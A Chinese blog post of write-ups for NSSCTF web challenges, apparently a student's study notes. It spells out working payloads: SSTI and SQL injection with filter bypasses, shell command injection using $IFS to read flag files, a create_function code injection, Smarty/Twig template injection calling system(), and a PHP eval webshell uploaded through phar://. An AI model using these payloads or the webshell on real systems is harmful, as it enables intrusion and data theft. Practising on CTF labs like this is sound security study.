---
title: NSSCTF-web方向第六页题解
published: 2025-08-18
description: "NSSCTF-web"
image: "./cover-6.jpg"
tags: ["CTF"]
category: NSSCTF
draft: false
---

# [HNCTF 2022 WEEK2]ez_SSTI

![image-20250817110742622](./NSSCTF-6.assets/image-20250817110742622.png)

题目提示ssti，可是没有参数，先尝试name

![image-20250817110902485](./NSSCTF-6.assets/image-20250817110902485.png)

可以确定ssti模版

```
?name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

![image-20250817110959472](./NSSCTF-6.assets/image-20250817110959472.png)

```
?name={{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

![image-20250817111036404](./NSSCTF-6.assets/image-20250817111036404.png)



先判断字符型，查找列数

![image-20250817114238757](./NSSCTF-6.assets/image-20250817114238757.png)

发现or和空格被过滤，用双写or绕过，用/**/代替空格，--+也被过滤了，用#号带替--+

```
nss=1'/**/oorrder/**/by/**/3#
```

判断列数为3

查库

```
nss=-1'/**/uunionnion/**/select/**/1,database(),3#
```

![image-20250817114646115](./NSSCTF-6.assets/image-20250817114646115.png)

没有直接给库名，结果可能不在这页，用limit语句里限制查询结果数量

```
SELECT * FROM table_name LIMIT 偏移量, 数量;
```

```
nss=-1'/**/uunionnion/**/select/**/1,database(),3/**/limit/**/1,1#
```

![image-20250817123143813](./NSSCTF-6.assets/image-20250817123143813.png)

```
nss=-1'/**/uunionnion/**/select/**/1,group_concat(table_name),3/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1;#
```

![image-20250817123348498](./NSSCTF-6.assets/image-20250817123348498.png)

```
nss=-1'/**/uunionnion/**/select/**/1,group_concat(column_name),3/**/from/**/infoorrmation_schema.columns/**/where/**/table_name="NSS_tb"/**/limit/**/1,1;#
```

![image-20250817123434595](./NSSCTF-6.assets/image-20250817123434595.png)

```
nss=-1'/**/uunionnion/**/select/**/1,group_concat("flll444g"),3/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1;#
```

![image-20250817123700786](./NSSCTF-6.assets/image-20250817123700786.png)

```
nss=-1'/**/uunionnion/**/select/**/1,group_concat(Secr3t),3/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1#
```

![image-20250817123714257](./NSSCTF-6.assets/image-20250817123714257.png)

# [MoeCTF 2021]babyRCE

![image-20250818082736245](./NSSCTF-6.assets/image-20250818082736245.png)

过滤掉不少东西，尝试传入ls

![image-20250818082950101](./NSSCTF-6.assets/image-20250818082950101.png)

```
c\at${IFS}fl\ag.php
```

![image-20250818083215275](./NSSCTF-6.assets/image-20250818083215275.png)

```
<!--?php
$flag = 'NSSCTF{535524fc-0ff4-43ea-ac30-97488f71c1ba}';-->
```

# [FSCTF 2023]源码！启动!

右键被禁用，直接**f12，ctrl+u，view-source:**

![image-20250818083403260](./NSSCTF-6.assets/image-20250818083403260.png)

```
<!--
    师傅们，欢迎来到CTF的世界~
    NSSCTF{ce0e6488-7bc0-45d3-9954-2fc008fa0c06}
    --->
```



# [WUSTCTF 2020]朴实无华

![image-20250818083840768](./NSSCTF-6.assets/image-20250818083840768.png)

扫描端口，在robots.txt中找到路径/fAke_f1agggg.php

![image-20250818083912794](./NSSCTF-6.assets/image-20250818083912794.png)



![image-20250818084131102](./NSSCTF-6.assets/image-20250818084131102.png)

藏的有点深吧，我说实话

![image-20250818084216658](./NSSCTF-6.assets/image-20250818084216658.png)

第一层要求同时满足：`intval($num) < 2020，intval($num + 1) > 2021`，

我们构造**?num=11e3**

`intval("11e3")` → 11（因为 `intval()` 对字符串会先取前缀的整型部分，科学计数法没法直接识别）
 → 符合 `< 2020` 

`$num + 1` = `11e3 + 1` ≈ `11001` 

**在PHP中，`intval()`对于字符串和数字的表现有所不同。比如，`intval("11e3 ")`返回11，原因是PHP会在遇到非数字字符（如'e'）时停止解析。而将字符串“11e3 ”加1时，会被识别为数字字符串，返回的结果是`11001`。**

第二层绕过，使用的是md5弱比较，只要找到一个值的MD5值等于他本身  **0e2159620**

```
/fl4g.php/?num=11e3&md5=0e215962017
```

第三层绕过，GET传参get_flag，不能有空格，而且会将cat转化为wctf2020

先查看目录

```
/fl4g.php/?num=11e3&md5=0e215962017&get_flag=ls
```

![image-20250818085422079](./NSSCTF-6.assets/image-20250818085422079.png)

空格用**$IFS$9**绕过，cat使用**tac**绕过

```
/fl4g.php?num=11e3&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

![image-20250818085647772](./NSSCTF-6.assets/image-20250818085647772.png)

# [鹤城杯 2021]Middle magic

![image-20250818090639293](./NSSCTF-6.assets/image-20250818090639293.png)

第一层if，**因为`preg_replace`函数只能匹配一行的数据**，因此我们只需先传入换行符，那么后面的传入便不再被匹配*%0a和%23分别是换行符和井号键的url编码*

```
/?aaa=%0apass_the_level_1%23
```

第二个if，我们利用数组绕过，具体原因是sha1加密时，若传入的是数组，返回值为null

```
admin[]=1&root_pwd[]=2
```



**json_decode()**

```
json_decode ( string $json [, bool $assoc = false [, int $depth = 512 , int $options = 0]]] )
```

json_decode接受一个JSON格式的字符串并且把它转换为PHP变量,当该参数assoc为TRUE时，将返回array，否则返回object。



- 第三个if，我们传入一个JSON格式的字符串，即：

```
level_3={"result":0}
```

php弱比较在面对纯字符与0的比较时，会返回true，例如`a == 0`返回为true
推测$result是纯字符，因此构造`result->0`（佬的思路）

最后构造payload

```
get传入  /?aaa=%0apass_the_level_1%23
post传入  admin[]=1&root_pwd[]=2&level_3={"result":0}
```



![image-20250818091122972](./NSSCTF-6.assets/image-20250818091122972.png)

# [HGAME 2023 week1]Classic Childhood Game

翻源码，在event.js中看到

![image-20250818092517603](./NSSCTF-6.assets/image-20250818092517603.png)

```
var a = ['\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35'];
```

![image-20250818093137757](./NSSCTF-6.assets/image-20250818093137757.png)

再两次base64解码得到

![image-20250818093206682](./NSSCTF-6.assets/image-20250818093206682.png)



# [NISACTF 2022]level-up

![image-20250818093353572](./NSSCTF-6.assets/image-20250818093353572.png)

看到disallow想到robots.txt，访问

![image-20250818093435972](./NSSCTF-6.assets/image-20250818093435972.png)

![image-20250818093455938](./NSSCTF-6.assets/image-20250818093455938.png)

数组不行，**php的数组在进行string强制转换时，会将数组转换为NULL类型 null=null就成立了，没绕过去**

直接使用md5值的碰撞

![image-20250818163819269](./NSSCTF-6.assets/image-20250818163819269.png)

**不要用hackbar传，传不上去（暂时不知道为什么）**



![image-20250818164044612](./NSSCTF-6.assets/image-20250818164044612.png)

第三关md5变成了sha1，还是一样的操作

![image-20250818164151310](./NSSCTF-6.assets/image-20250818164151310.png)

第四关

![image-20250818164228182](./NSSCTF-6.assets/image-20250818164228182.png)

过滤掉了空格、下划线、`.`，题目需要GET传入的参数又有下划线，这时可以用`+ [`来替换掉下划线

```bash
/level_level_4.php?NI+SA+=txw4ever
```

PHP 在把 GET/POST 参数解析进 `$_GET`、`$_POST` 时，会把参数名转换成合法的 PHP 变量名。

规则包括：

- **字母、数字、下划线** 可以原样保留；
- **点号 (`.`)、加号 (`+`)、空格 (` `)、方括号 (`[`)** 等都会被处理；
  - **`.` 会被转换成 `_`**
  - **空格、`+` 也会变成 `_`**
  - **`[` 触发数组解析机制**

当 `[` 提前出现后，后面的 `.` 就不会再被转义

![image-20250818165717179](./NSSCTF-6.assets/image-20250818165717179.png)

**parse_url可以用///绕过**（参考：[parse_url函数的解释和绕过_parseurl-CSDN博客](https://blog.csdn.net/q1352483315/article/details/89672426?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1)）

![image-20250818170309791](./NSSCTF-6.assets/image-20250818170309791.png)

第五关

![image-20250818171156336](./NSSCTF-6.assets/image-20250818171156336.png)

对于传入的参数a，过滤掉非字母、数字、下划线，不分字母大小写

> create_function(string a, string b)会创造一个匿名函数，传入的两个参数均为字符串
>
> 其中，字符串a中表示函数需要传入的参数，字符串b表示函数中的执行语句
>
> 例如，create_function('$a', 'echo("hello");')，我们需要把它看作：
>
> ```php
> function niming($a)
> {
> 	echo("hello");
> }
> ```

因为`create_function`自带eval命令执行，因此我们需要传入`$a`为`\create_function`；

而对于参数`$b`，我们需要让它执行system()函数，用于回显flag，因此传入`$b`为`}system('cat /flag');//`

那么对于这个create_function来说，它的展开应该是这样的：

```scss
function niming()
{
}system('cat /flag');//}
```

> 这里参数b中的大括号直接把function闭合了，因此后面的system可以正常进行，且原先的大括号被注释掉了，就不会报错

```
/55_5_55.php?a=\create_function&b=}system('cat /flag');//
```

# [NISACTF 2022]bingdundun~

![image-20250818182213531](./NSSCTF-6.assets/image-20250818182213531.png)

## phar://

主要是用于在php中对压缩文件格式的读取。

Phar是PHP的归档格式，类似Java的JAR或是.NET的ZIP。Phar文件可以在不需要解压的情况下在PHP中运行。Phar文件可以用于分发PHP代码，就像你分发Python代码时使用的是.pyc或.whl文件。

Phar伪协议是PHP的一个特性，它允许直接从Phar归档中读取文件，而不需要将Phar文件解压。这样可以直接从Phar文件运行PHP脚本，而无需在服务器上物理地提取文件。

如果使用的是 PHP 5.3 或更高版本，那么 .phar 后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。而phar://的伪协议，可以将任意后缀名的压缩包（原来是 .phar 或 .zip，注意：PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行 ) 解包，从而可以通过上传压缩包绕过对后缀名的限制，再利用伪协议实现文件包含。

用法就是把一句话木马压缩成zip格式，shell.php -> shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传 zip 文件），再访问：?filename=phar://…/shell.zip/shell.php



### 法一

直接创建一个一句话木马文件，并将其压缩为zip文件。

shell.php -> shell.zip

```php
<?=eval($_REQUEST['cmd']);?>
```

![image-20250818182810338](./NSSCTF-6.assets/image-20250818182810338.png)

前面测试过，会在后面自动加上php并执行，所以最后文件不用再加

```
http://node5.anna.nssctf.cn:20083/?bingdundun=phar://8438b53b29545499f443027dfcecef76.zip/shell
```

![image-20250818183759855](./NSSCTF-6.assets/image-20250818183759855.png)

![image-20250818183838951](./NSSCTF-6.assets/image-20250818183838951.png)

### 法二生成 phar 文件

**注意：默认phar扩展是只读模式，需要手动配置php.ini中phar.readonly= Off且无法用ini_set修改**



# [MoeCTF 2021]Web安全入门指北—小饼干

![image-20250819101623882](./NSSCTF-6.assets/image-20250819101623882.png)

# [SWPUCTF 2022 新生赛]numgame

![image-20250819170329344](./NSSCTF-6.assets/image-20250819170329344.png)

右键，crtl+u没有反应，

在url前面加上**view-source:**

![image-20250819170432810](./NSSCTF-6.assets/image-20250819170432810.png)

点击查看1.js

![image-20250819170459066](./NSSCTF-6.assets/image-20250819170459066.png)

![image-20250819170521811](./NSSCTF-6.assets/image-20250819170521811.png)

```
NsScTf.php
```

![image-20250819170546038](./NSSCTF-6.assets/image-20250819170546038.png)

```
?p=Nss2::Ctf
```



![image-20250819172956920](./NSSCTF-6.assets/image-20250819172956920.png)

![image-20250819173022055](./NSSCTF-6.assets/image-20250819173022055.png)

```
p=nss2::ctf
```

![image-20250819173044927](./NSSCTF-6.assets/image-20250819173044927.png)



# [MoeCTF 2022]ezhtml



![image-20250820070100473](./NSSCTF-6.assets/image-20250820070100473.png)



# [FSCTF 2023]webshell是啥捏

![image-20250820070713484](./NSSCTF-6.assets/image-20250820070713484.png)

😭拼接起来是passthru

`passthru()` 会在服务器上执行系统命令，并把结果直接输出。

`eval()` 再去执行 `passthru()` 的返回值（不过 `passthru()` 实际上返回 `NULL`，主要作用是把输出直接显示出来）。

```
?👽=ls /

返回：bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

**payload**

```
?👽=cat /flag.txt
FSCTF{h3llo_ctfe2_5ign_in_webshell_Is_e@sy_right}
```

这个flag不能改成NSSCTF，直接提交才行







# [HDCTF 2023]SearchMaster

![image-20250820073239696](./NSSCTF-6.assets/image-20250820073239696.png)

翻源码和请求头，都没有东西，但给了我们以一个提示，可以post传数据

我们尝试dirsearch扫描一波

![image-20250820073343850](./NSSCTF-6.assets/image-20250820073343850.png)



![image-20250820073410186](./NSSCTF-6.assets/image-20250820073410186.png)

发现有smarty

```
data={php}phpinfo();{/php}   //php报错

构造
data={if system('ls /f*')}{/if}
返回：/flag_13_searchmaster
再构造
data={if system('cat /flag_13_searchmaster')}{/if}
```

还发现

![image-20250820073939393](./NSSCTF-6.assets/image-20250820073939393.png)

![image-20250820074014847](./NSSCTF-6.assets/image-20250820074014847.png)

只需要做`{{7*'7'}}`，返回7777777表示是 Jinja2 模块

这里不是，判断是Twig 模块，表示后端是PHP

```
{{system('ls')}}
```

![image-20250820074137283](./NSSCTF-6.assets/image-20250820074137283.png)

一样找到flag



最后有一张图

![image-20250820074205855](./NSSCTF-6.assets/image-20250820074205855.png)



# [SWPUCTF 2022 新生赛]webdog1__start

![image-20250820074344443](./NSSCTF-6.assets/image-20250820074344443.png)

所以我们选取0e或者加密后仍为0e开头的数：0e215962017



![image-20250820074947622](./NSSCTF-6.assets/image-20250820074947622.png)

![image-20250820075019000](./NSSCTF-6.assets/image-20250820075019000.png)

![image-20250820080104297](./NSSCTF-6.assets/image-20250820080104297.png)

```
?get=system('cat%09/*');
system('nl%09/*'); //nl 会把每个文件的内容按行号列出来。
这俩是一样的

?get=eval($_GET['a']);&a=system("cat /flag"); //题目是执行get的内容，让这个get再去执行一个参数
```



# 小结

第6页写完了，可是感觉不会的东西还是一堆，碰到稍微难一点的题目，或者自己没遇到过的知识点，直接就嘎巴栽那了。

接下来，不是一页一页的写了，这样有问题，我准备一个专题一个专题的去准备。

还有就是，看到大佬的博客和经历， 感觉他们还都是让我仰望的存在，差距还很大，必须抓紧时间。

最后，说实话，我的博客写的真垃圾，全是流水账，以后对多加改善。